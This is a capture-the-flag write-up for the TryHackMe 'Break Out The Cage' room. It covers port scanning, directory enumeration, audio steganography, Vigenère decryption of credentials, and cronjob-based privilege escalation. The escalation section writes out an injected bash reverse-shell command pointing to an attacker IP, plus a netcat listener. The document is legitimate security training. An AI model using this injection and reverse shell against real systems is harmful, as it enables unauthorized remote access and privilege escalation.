---
draft: false
title: Break Out The Cage
ctf: ''
platform: TryHackMe
date: 2026-05-08
image: https://assets.tryhackme.com/additional/banners/Rayti35.png
description: ''
ctf_link: https://tryhackme.com/room/breakoutthecage1
difficulty: Easy
---

## Reconnaissance

### Nmap Scan

```bash
# Nmap 7.99 scan initiated Fri May  8 19:10:05 2026
nmap -sV -o nmap_scan 10.82.169.149
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Three ports are open: **FTP (21)**, **SSH (22)**, and **HTTP (80)**. Let's start with the web server.

---

## Web Enumeration

The homepage doesn't reveal anything particularly interesting at first glance.

![Website homepage](/img/writeups/pasted-image-1778264072334.png)

Running a **Gobuster** directory scan uncovers several interesting endpoints:

```bash
gobuster dir -u http://$IP -w ../SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```
/images       (Status: 301)
/html         (Status: 301)
/scripts      (Status: 301)
/contracts    (Status: 301)
/auditions    (Status: 301)
/server-status (Status: 403)
```

### `/scripts`

This directory contains various movie scripts — nothing immediately exploitable, but it confirms the Nicolas Cage theme of the box.

![Scripts directory listing](/img/writeups/20260508-191819.png)
![Script content](/img/writeups/20260508-191838.png)

### `/contracts`

Just an empty folder. Dead end.

![Contracts directory](/img/writeups/20260508-191914.png)

### `/auditions` — Hidden message in a spectrogram

This directory hosts a suspicious MP3 file: `must_practice_corrupt_file.mp3`.

![Auditions directory](/img/writeups/20260508-192022.png)

I downloaded it and imported it into **Audacity** to inspect it visually:

```bash
wget http://10.82.169.149/auditions/must_practice_corrupt_file.mp3 -O must_practice_file.mp3
```

By switching to the **spectrogram view**, a hidden message appears:

> **`namelesstwo`**

![Spectrogram revealing the hidden message](/img/writeups/20260508-192742.png)

Let's keep that string in mind for later.

---

## FTP — Anonymous Login

A second Nmap scan with the `-sC` flag (default scripts) reveals that the FTP server accepts **anonymous connections**.

![Nmap -sC scan result](/img/writeups/20260508-194925.png)

```bash
ftp $IP
# Username: anonymous
# Password: (blank)
```

Inside, there's a single file: `dad_tasks`. After downloading it, its contents turn out to be a Base64-encoded string:

```
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQp...
```

Decoding it via **CyberChef** (From Base64) gives:

```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

This is clearly still encrypted. Caesar cipher and XOR with `namelesstwo` as a key didn't work. After going through a list of classic ciphers, the answer was **Vigenère** — with the key we found in the spectrogram: **`namelesstwo`**.

![CyberChef Vigenère decryption result](/img/writeups/20260508-200415.png)

This reveals **Weston's password** and solves the first question. ✅

---

## SSH — Weston's Account

```bash
ssh weston@10.82.169.149
```

![SSH connection](/img/writeups/20260508-200659.png)

The home directory is empty. Checking `sudo` privileges:

```bash
sudo -l
```

![Sudo privileges for Weston](/img/writeups/20260508-201801.png)

Weston can run `/usr/bin/bees` as root:

```bash
cat /usr/bin/bees
#!/bin/bash
wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```

This just broadcasts a message to all users — a **rabbit hole**.

---

## Privilege Escalation to Cage — Abusing a Cronjob

Exploring `/opt/`, I find a more interesting script:

```
/opt/.dads_scripts/
```

The script picks random quotes from a file and executes them. Crucially, **Weston has write permissions on the quotes file**. I replaced its contents with a reverse shell:

```bash
echo "; bash -c 'bash -i >& /dev/tcp/192.168.137.101/4444 0>&1'" > /opt/.dads_scripts/.files/.quotes
```

On my machine, I set up a listener:

```bash
nc -lvnp 4444
```

After waiting for the cronjob to trigger:

```
Connection received on 10.82.169.149 56238
cage@national-treasure:~$
```

**Shell as `cage` obtained.** The user flag is in the home directory. 🚩

![User flag](/img/writeups/20260508-205006.png)

---

## Privilege Escalation to Root — Email Loot

In `cage`'s home directory, there's an `email_backup` folder containing three emails. The key takeaways are:

- The root account belongs to **Sean Archer** (username: `root`)
- One email from Cage to Weston contains a suspicious string: **`haiinspsyanileph`**
- The same email is littered with references to **faces** and the movie *Face/Off*

This strongly hints at another **Vigenère cipher**, this time with the key **`face`**.

Decrypting `haiinspsyanileph` with Vigenère / key `face` gives Sean's password, which works for `su root`. 🚩

---

## Conclusion

That was a fun CTF where I learned :

- **Steganography:** Hidden text embedded in an audio spectrogram (Audacity)
- **Cryptography:** Vigenère cipher used twice, with keys hidden in context clues
- **Privilege escalation:** Abusing a writable file used by a cronjob running as a higher-privileged user
